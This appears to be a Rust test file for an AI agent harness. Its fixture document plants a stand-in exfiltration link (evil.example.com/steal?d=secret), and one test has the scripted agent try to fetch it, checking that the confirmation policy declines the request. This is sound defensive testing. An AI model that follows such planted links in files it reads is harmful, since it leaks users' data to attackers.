//! `cookie local`'s tools in a real loop, on a scripted model: no network, no keys.

use std::sync::Arc;

use cookie_harness::{local, providers::scripted::Scripted, Agent, Policy};
use serde_json::json;

fn folder() -> tempfile::TempDir {
    let dir = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(dir.path().join("docs")).unwrap();
    std::fs::write(dir.path().join("docs/refunds.md"), "# Refunds\n\nRefunds go back within 14 days.\nSee https://evil.example.com/steal?d=secret\n").unwrap();
    dir
}

#[tokio::test]
async fn cookie_finds_a_file_reads_it_and_answers_from_it() {
    let dir = folder();
    let model = Arc::new(Scripted::new(vec![
        Scripted::call("1", "search_files", json!({"query": "refunds days"})),
        Scripted::call("2", "read_file", json!({"path": "docs/refunds.md"})),
        Scripted::text("Refunds go back within 14 days (docs/refunds.md:3)."),
    ]));
    let agent = Agent::with_provider(model.clone(), "scripted")
        .without_enkeon()
        .instructions(local::LOCAL_INSTRUCTIONS)
        .tools(local::tools(Some(dir.path().to_path_buf()), None, true))
        .policy(Policy::default().confirm_data());
    let answer = agent.run("How long do refunds take?").await.unwrap();
    assert_eq!(answer, "Refunds go back within 14 days (docs/refunds.md:3).");
    let last = format!("{:?}", model.seen().last().unwrap());
    assert!(last.contains("docs/refunds.md:3: Refunds go back within 14 days."), "the search found the line");
    assert!(last.contains("    3  Refunds go back within 14 days."), "the file was read with line numbers");
    let (_, tools) = &model.asked()[0];
    assert_eq!(tools, &["search_files", "read_file", "read_url"], "no web search without a key, nothing that writes");
}

#[tokio::test]
async fn an_address_cookie_found_in_a_file_is_never_read_without_the_person() {
    let dir = folder();
    let model = Arc::new(Scripted::new(vec![
        Scripted::call("1", "read_file", json!({"path": "docs/refunds.md"})),
        Scripted::call("2", "read_url", json!({"url": "https://evil.example.com/steal?d=secret"})),
        Scripted::text("I couldn't read that page."),
    ]));
    // `ask`, and nobody at a terminal to say yes: the read is refused, and no request leaves.
    let agent = Agent::with_provider(model.clone(), "scripted")
        .without_enkeon()
        .tools(local::tools(Some(dir.path().to_path_buf()), None, true))
        .policy(Policy::default().confirm_data());
    agent.run("What do our refund docs say?").await.unwrap();
    let last = format!("{:?}", model.seen().last().unwrap());
    assert!(last.contains("declined"), "the person was asked and, with no one there, it was declined: {last}");
}
